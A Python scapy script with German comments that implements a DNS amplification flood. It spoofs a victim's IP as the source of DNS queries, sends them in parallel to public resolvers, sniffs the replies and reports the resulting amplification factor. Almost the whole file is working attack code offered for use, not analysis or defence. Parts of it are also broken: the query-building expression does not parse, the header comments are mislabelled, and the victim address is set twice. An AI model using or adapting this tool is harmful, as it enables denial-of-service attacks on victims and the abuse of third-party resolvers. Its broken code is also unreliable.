from scapy.all import *
import threading
import random
import time
import logging

packet_counter = 0
stop_event = threading.Event()
response_sizes = []  # Zur Berechnung des Amplification-Faktors

# Logging einrichten
logging.basicConfig(filename="dns_amplification.log", level=logging.INFO, format="%(asctime)s - %(message)s")

def log_packet_info(packet_info):
    logging.info(packet_info)

def send_dns_amplification(victim_ip, resolver_ip, target_domain, query_type, max_bandwidth):
    """Sendet gefälschte DNS-Anfragen für Amplification mit Bandbreitenkontrolle."""
    global packet_counter

    # DNS-Abfrage basierend auf Typ (A, MX, TXT, ANY)
    dns_query = (
        b'\xaa\xbb'  # Transaction ID (random)
        b'\x01\x00'  # Standard query
        b'\x00\xff'  # ANY Type
        b'\x00\x01'  # Questions: 1
        b'\x00\x00'  # Answer RRs
        b'\x00\x00'  # Authority RRs
        b'\x00\x00'  # Additional RRs
        + bytes(target_domain, "utf-8") + b'\x00'  # Query domain
        + query_type  # Query Type
        b'\x00\x01'  # Class: IN
    )

    udp_packet = IP(src=victim_ip, dst=resolver_ip) / UDP(dport=53) / dns_query

    start_time = time.time()
    bytes_sent = 0
    try:
        while not stop_event.is_set():
            send(udp_packet, verbose=False)
            packet_counter += 1
            bytes_sent += len(bytes(udp_packet))

            # Bandbreitenkontrolle
            if max_bandwidth:
                elapsed_time = time.time() - start_time
                if bytes_sent / elapsed_time > max_bandwidth:
                    time.sleep(0.01)  # Wartezeit, um die Bandbreite zu begrenzen

            log_packet_info(f"Gesendetes Paket #{packet_counter} an {resolver_ip} von {victim_ip}")
    except KeyboardInterrupt:
        stop_event.set()
    finally:
        print("Flood gestoppt.")

def sniff_responses(resolver_list, duration=10):
    """Snifft Antworten auf die gesendeten DNS-Anfragen."""
    def filter_response(packet):
        return packet.haslayer(DNS) and packet[IP].src in resolver_list

    print("Starte Sniffer für Antworten...")
    packets = sniff(filter=filter_response, timeout=duration)
    for pkt in packets:
        response_size = len(pkt)
        response_sizes.append(response_size)
        print(f"Empfangene Antwort: {response_size} Bytes")
        log_packet_info(f"Empfangene Antwort von {pkt[IP].src}: {response_size} Bytes")

def start_amplification(victim_ip, resolver_list, target_domain, query_type, duration=10, max_bandwidth=None):
    """Startet den Amplification-Flood."""
    threads = []

    try:
        # Starte Sniffer-Thread
        sniffer_thread = threading.Thread(target=sniff_responses, args=(resolver_list, duration))
        sniffer_thread.start()

        for resolver_ip in resolver_list:
            thread = threading.Thread(target=send_dns_amplification, args=(victim_ip, resolver_ip, target_domain, query_type, max_bandwidth))
            threads.append(thread)
            thread.start()

        threading.Timer(duration, stop_event.set).start()

        for thread in threads:
            thread.join()
        sniffer_thread.join()

        # Berechne Amplification-Faktor
        if response_sizes:
            avg_response_size = sum(response_sizes) / len(response_sizes)
            amplification_factor = avg_response_size / len(query_type)
            print(f"Durchschnittliche Antwortgröße: {avg_response_size:.2f} Bytes")
            print(f"Amplification-Faktor: {amplification_factor:.2f}")
            log_packet_info(f"Durchschnittliche Antwortgröße: {avg_response_size:.2f} Bytes")
            log_packet_info(f"Amplification-Faktor: {amplification_factor:.2f}")
    except KeyboardInterrupt:
        stop_event.set()
    finally:
        print(f"Gesendete Pakete: {packet_counter}")

# Menü zur Auswahl des DNS-Typs
def choose_query_type():
    print("Wähle den DNS-Abfrage-Typ:")
    print("1. ANY (Standard)")
    print("2. A")
    print("3. MX")
    print("4. TXT")
    choice = input("Eingabe (1-4): ")

    if choice == "2":
        return b'\x00\x01'  # A
    elif choice == "3":
        return b'\x00\x0f'  # MX
    elif choice == "4":
        return b'\x00\x10'  # TXT
    else:
        return b'\x00\xff'  # ANY (Standard)

# Beispielaufruf
if __name__ == "__main__":
    resolver_list = ["8.8.8.8", "8.8.4.4"]  # Liste von DNS-Resolvern
    victim_ip = "192.168.1.100"
    victim_ip = "192.168.0.1" # IP des Opfers
    target_domain = "\x07example\x03com"  # Domain im DNS-Format
    query_type = choose_query_type()
    max_bandwidth = int(input("Maximale Bandbreite (Bytes/s, 0 für unbegrenzt): ")) or None

    start_amplification(victim_ip, resolver_list, target_domain, query_type, duration=10, max_bandwidth=max_bandwidth)
